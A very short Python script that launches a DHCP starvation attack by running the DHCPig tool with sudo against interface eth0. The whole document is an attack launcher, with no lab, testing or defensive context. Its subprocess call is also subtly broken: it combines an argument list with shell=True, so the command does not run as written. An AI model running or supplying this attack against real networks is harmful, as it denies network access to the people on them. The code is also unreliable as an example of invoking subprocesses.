#!/usr/bin/env python3
import subprocess
print("[+] Launching DHCP Starvation using DHCPig...")
subprocess.run(["sudo", "python3", "$(which dhcpig)", "-i", "eth0"], shell=True)